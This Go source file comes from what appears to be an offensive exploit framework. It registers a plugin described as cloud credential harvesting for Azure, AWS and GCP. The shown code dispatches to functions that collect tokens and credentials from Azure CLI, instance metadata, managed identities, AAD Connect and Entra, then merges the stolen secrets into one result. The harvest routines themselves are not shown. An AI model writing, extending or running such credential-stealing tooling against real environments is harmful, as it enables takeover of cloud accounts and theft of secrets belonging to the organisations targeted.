package cloud

import (
	"context"
	"fmt"

	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
	"github.com/KKingZero/erebus-exploit-framwork/pkg/plugin"
	"google.golang.org/protobuf/proto"
)

func init() {
	plugin.Global.Register(&CloudModule{})
}

type CloudModule struct{}

func (m *CloudModule) Name() string        { return "cloud" }
func (m *CloudModule) Description() string { return "Cloud credential harvesting (Azure/AWS/GCP)" }

func (m *CloudModule) Execute(ctx context.Context, config []byte) ([]byte, error) {
	cfg := &pb.CloudHarvestConfig{}
	if err := proto.Unmarshal(config, cfg); err != nil {
		return nil, fmt.Errorf("unmarshal cloud harvest config: %w", err)
	}

	provider := cfg.Provider
	if provider == "" {
		provider = "all"
	}
	method := cfg.Method
	if method == "" {
		method = "all"
	}

	// M8: Check context cancellation before starting harvest
	if err := ctx.Err(); err != nil {
		return nil, fmt.Errorf("context cancelled before harvest: %w", err)
	}

	var results []*pb.CloudHarvestResult

	switch provider {
	case "azure":
		results = append(results, harvestAzure(ctx, method)...)
	case "aws":
		results = append(results, harvestAWS(ctx)...)
	case "gcp":
		results = append(results, harvestGCP(ctx)...)
	case "imds":
		if r := harvestIMDS(ctx); r != nil {
			results = append(results, r)
		}
	case "all":
		// L3: "all" should include IMDS detection too
		results = append(results, harvestAzure(ctx, method)...)
		results = append(results, harvestAWS(ctx)...)
		results = append(results, harvestGCP(ctx)...)
		if r := harvestIMDS(ctx); r != nil {
			results = append(results, r)
		}
	default:
		return nil, fmt.Errorf("unknown cloud provider: %s (available: azure, aws, gcp, imds, all)", provider)
	}

	// Merge all results into a single response
	merged := &pb.CloudHarvestResult{
		Provider: provider,
		Method:   method,
	}
	for _, r := range results {
		merged.Tokens = append(merged.Tokens, r.Tokens...)
		merged.Credentials = append(merged.Credentials, r.Credentials...)
		if r.Metadata != "" {
			if merged.Metadata != "" {
				merged.Metadata += "\n"
			}
			merged.Metadata += r.Metadata
		}
	}

	return proto.Marshal(merged)
}

func harvestAzure(ctx context.Context, method string) []*pb.CloudHarvestResult {
	var results []*pb.CloudHarvestResult

	switch method {
	case "cli":
		if r := harvestAzureCLI(ctx); r != nil {
			results = append(results, r)
		}
	case "imds":
		if r := harvestIMDS(ctx); r != nil {
			results = append(results, r)
		}
	case "managed_identity":
		if r := harvestManagedIdentity(ctx); r != nil {
			results = append(results, r)
		}
	case "adconnect":
		if r := harvestAADConnect(ctx); r != nil {
			results = append(results, r)
		}
	case "entra_token":
		if r := harvestEntraToken(ctx); r != nil {
			results = append(results, r)
		}
	case "all":
		if r := harvestAzureCLI(ctx); r != nil {
			results = append(results, r)
		}
		if r := harvestIMDS(ctx); r != nil {
			results = append(results, r)
		}
		if r := harvestManagedIdentity(ctx); r != nil {
			results = append(results, r)
		}
		if r := harvestAADConnect(ctx); r != nil {
			results = append(results, r)
		}
		if r := harvestEntraToken(ctx); r != nil {
			results = append(results, r)
		}
	default:
		// L3: Default should harvest all Azure methods, not just CLI
		if r := harvestAzureCLI(ctx); r != nil {
			results = append(results, r)
		}
		if r := harvestIMDS(ctx); r != nil {
			results = append(results, r)
		}
		if r := harvestManagedIdentity(ctx); r != nil {
			results = append(results, r)
		}
	}

	return results
}
